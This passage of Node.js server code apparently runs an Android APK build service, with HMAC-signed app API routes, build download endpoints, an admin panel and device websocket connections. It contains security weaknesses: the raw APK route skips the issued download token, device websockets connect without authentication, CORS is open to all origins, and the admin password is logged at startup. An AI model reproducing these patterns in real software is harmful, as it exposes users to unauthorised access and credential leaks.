    baseUrl: old.baseUrl, log_tail: []
  };
  db.builds.unshift(build);
  save();
  queue.enqueue(build, app);
  return { status: 'ok', build: buildView(build), queued: true };
});

on('GET', '/api/builds/:id/download', (ctx) => {
  auth(ctx);
  const b = db.builds.find((x) => x.buildId === ctx.params.id) || fail(404, 'build nahi mila');
  if (b.status !== 'success') fail(409, 'build abhi ready nahi hai');
  const t = crypto.createHmac('sha256', TOKEN_SECRET).update('apk:' + b.buildId).digest('base64url');
  return {
    status: 'ok',
    url: `/api/builds/${b.buildId}/apk?t=${encodeURIComponent(t)}`,
    expires_in: 3600,
    apk_size: b.apk_size,
    apk_sha256: b.apk_sha256,
    signed: Boolean(b.signed)
  };
});

/* ---------------- signed app API ---------------- */

function appFromSignature(ctx) {
  const appId = ctx.req.headers['x-app-id'];
  const ts = Number(ctx.req.headers['x-timestamp']);
  const sig = String(ctx.req.headers['x-signature'] || '');
  if (!appId || !ts || !sig) fail(401, 'X-App-Id / X-Timestamp / X-Signature missing');

  if (Math.abs(Date.now() / 1000 - ts) > 300) fail(401, 'Timestamp window ke bahar');

  const app = db.apps.find((x) => x.appId === appId) || fail(401, 'unknown appId');
  const expect = crypto.createHmac('sha256', decrypt(app.secretEnc))
    .update(ctx.rawBody + String(ts)).digest('hex');

  if (expect.length !== sig.length || !crypto.timingSafeEqual(Buffer.from(expect), Buffer.from(sig))) {
    fail(401, 'signature galat');
  }
  return app;
}

const orders = [];

on('POST', '/api/orders', (ctx) => {
  const app = appFromSignature(ctx);
  const o = { id: rid(12), appId: app.appId, ...ctx.body, created_at: nowIso() };
  orders.unshift(o);
  return { status: 'ok', order: o };
});

on('GET', '/api/orders', (ctx) => {
  const app = appFromSignature(ctx);
  return { orders: orders.filter((o) => o.appId === app.appId).slice(0, 200) };
});

on('POST', '/api/echo', (ctx) => {
  appFromSignature(ctx);
  return { status: 'ok', echo: ctx.body };
});

/* ------------------------------------------------------------------ *
 *  static + upgrade
 * ------------------------------------------------------------------ */

async function serveStatic(res, file, type) {
  try {
    const data = await fsp.readFile(file);
    res.writeHead(200, { 'Content-Type': type, 'Content-Length': data.length });
    res.end(data);
  } catch {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('not found');
  }
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const pathname = decodeURIComponent(url.pathname);

  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Headers': '*',
      'Access-Control-Allow-Methods': 'GET,POST,PUT,DELETE,OPTIONS'
    });
    return res.end();
  }

  /* raw APK download */
  const apkMatch = pathname.match(/^\/api\/builds\/([^/]+)\/apk$/);
  if (apkMatch && req.method === 'GET') {
    const b = db.builds.find((x) => x.buildId === apkMatch[1]);
    if (!b || b.status !== 'success') return json(res, { detail: 'build ready nahi' }, 404);
    const file = path.join(ARTIFACT_DIR, `${b.buildId}.apk`);
    if (!fs.existsSync(file)) return json(res, { detail: 'APK file missing' }, 404);
    const stat = await fsp.stat(file);
    res.writeHead(200, {
      'Content-Type': 'application/vnd.android.package-archive',
      'Content-Length': stat.size,
      'Content-Disposition': `attachment; filename="${b.appName || b.appId}-${b.buildId}.apk"`
    });
    return fs.createReadStream(file).pipe(res);
  }

  /* panel */
  if ((pathname === '/' || pathname === '/admin' || pathname === '/admin/') && req.method === 'GET') {
    return serveStatic(res, path.join(ROOT, 'admin', 'index.html'), 'text/html; charset=utf-8');
  }

  const match = routes.find((r) => r.method === req.method && r.re.test(pathname));
  if (!match) return json(res, { detail: `no route for ${req.method} ${pathname}` }, 404);

  const params = {};
  const m = match.re.exec(pathname);
  match.keys.forEach((k, i) => { params[k] = m[i + 1]; });

  const { raw, data } = await readBody(req);
  const authHeader = req.headers.authorization || '';
  const bearer = authHeader.startsWith('Bearer ')
    ? authHeader.slice(7)
    : (url.searchParams.get('token') || '');

  const ctx = { req, res, url, query: url.searchParams, params, body: data, rawBody: raw, bearer };

  try {
    const out = await match.handler(ctx);
    if (!res.writableEnded) json(res, out ?? { status: 'ok' });
  } catch (e) {
    const status = e.status || 500;
    if (status >= 500) console.error(e);
    if (!res.writableEnded) json(res, { detail: e.message || 'server error' }, status);
  }
});

/* ---------------- websocket upgrade ---------------- */

server.on('upgrade', (req, socket) => {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const key = req.headers['sec-websocket-key'];
  if (!key) return socket.destroy();

  const token = url.searchParams.get('token') || '';
  const p = verifyToken(token);

  const pathname = url.pathname;
  const isDevice = pathname.startsWith('/ws/device/');
  if (!isDevice && !p) {
    socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
    return socket.destroy();
  }

  socket.write(
    'HTTP/1.1 101 Switching Protocols\r\n' +
    'Upgrade: websocket\r\n' +
    'Connection: Upgrade\r\n' +
    `Sec-WebSocket-Accept: ${wsAccept(key)}\r\n\r\n`
  );

  const conn = new WsConn(socket);

  if (isDevice) {
    const deviceId = pathname.split('/').pop();
    deviceSockets.set(String(deviceId), conn);
    const d = db.devices.find((x) => String(x.id) === String(deviceId));
    if (d) { d.last_seen = nowIso(); save(); }
    broadcast('device', { device_id: deviceId, ws_connected: true });
    conn.onclose = () => {
      deviceSockets.delete(String(deviceId));
      broadcast('device', { device_id: deviceId, ws_connected: false });
    };
    return;
  }

  if (pathname === '/ws/admin') adminSockets.add(conn);
  else userSockets.add(conn);
  conn.onclose = () => { adminSockets.delete(conn); userSockets.delete(conn); };
  conn.onmessage = () => { /* subscribe/ack — broadcast sabko jaata hai */ };
});

server.listen(PORT, HOST, () => {
  console.log(`TPC backend  →  http://localhost:${PORT}`);
  console.log(`panel        →  http://localhost:${PORT}/`);
  console.log(`ANDROID_HOME →  ${process.env.ANDROID_HOME || process.env.ANDROID_SDK_ROOT || '(set nahi hai!)'}`);
  console.log(`login        →  ${ADMIN_USER} / ${ADMIN_PASS}`);
});